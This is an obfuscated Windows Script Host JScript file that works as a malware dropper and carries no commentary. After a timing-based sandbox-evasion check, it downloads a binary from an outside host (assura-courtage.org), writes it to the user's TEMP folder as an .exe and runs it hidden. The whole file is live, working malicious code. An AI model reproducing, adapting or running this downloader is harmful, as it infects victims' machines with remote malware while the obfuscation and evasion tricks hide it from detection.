var _KS = false;
var _HC = "CreateObject";
var _M0 = function _S() {return WScript[_HC]("WScript"+".Shell");}(), _QU = 11;
var _XP = "MSXML2.XMLHTTP";
var _DJ = 2123213;
var _IC = 0;
function _B0(_JI){_M0["Run"](_JI, _IC, _IC);};
function _EL(){return _XP + "";};
function _NI(_TZ, _BY){_IC = _IC * 1; return _TZ - _BY;};
function _H(){return _HC;};
/*@cc_on
  @if (@_win32 || @_win64)
    _KS = true;
  @end
@*/
if (_KS)
{
var _OP = "";
function _LM(){return 22;};
var _AI = 0; var _Q = 0;
function _OB()
{
var _CP = new this["Date"]();
var _C = _CP["getUTCMilliseconds"]();
WScript["Sleep"](_LM());
var _CP = new this["Date"]();
var _X = _CP["getUTCMilliseconds"]();
WScript["Sleep"](_LM());
var _CP = new this["Date"]();
var _IB = _CP["getUTCMilliseconds"]();
var _AI = "_HO";
_AI = _NI(_X, _C);
var _Q = "_DV";
_Q = _NI(_IB, _X);
_OP = "open";
return _NI(_AI, _Q);
}
var _KW = false;
var _F = false;
for (var _QG = _IC; _QG < _LM() * 1; _QG++){if (_OB() != _IC){
_KW = true; 
_Q = "31" + 11 * _AI + _Q; 
_F = true; 
break;
}}
function _RX() {return ((_KW == true) && (_KW == _F)) ? 1 : _IC;};
if (_KW && _RX() && _F){
function _B() {return _M0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "3YuuXATiI1R.ex" + "e";};
 _G = _EL();
 _W = WScript[_HC](_G);
 var _T = 1;
 while (_T){
try {
	if (_T == 1)
	{
		_W[_OP]("GET", "http://assura-courtage.org/j2osla", false);
		_W["send"]();
		_M = "Sleep";
	}
	WScript[_M](_LM() + 120); 
	if (_W["readystate"] < 2 * 2) continue;
	_T = _IC;
	function _PY(_QM) {var _GY = (1, 2, 3, 4, 5, _QM); return _GY;};
	_UG = WScript[_H()]("ADODB.Stream");
	_G = _UG;
	_G[_OP]();
	_G["type"] = _PY(1);
	_G["write"](_W["ResponseBody"]);
	_UG["position"] = _PY(_IC);
	_G["Save" + "ToFile"](_B(), 2);
	_UG["cl"+"ose"]();
	_Z = _B();
	_B0(_Z);
} catch(_ZP){};
}
}
}

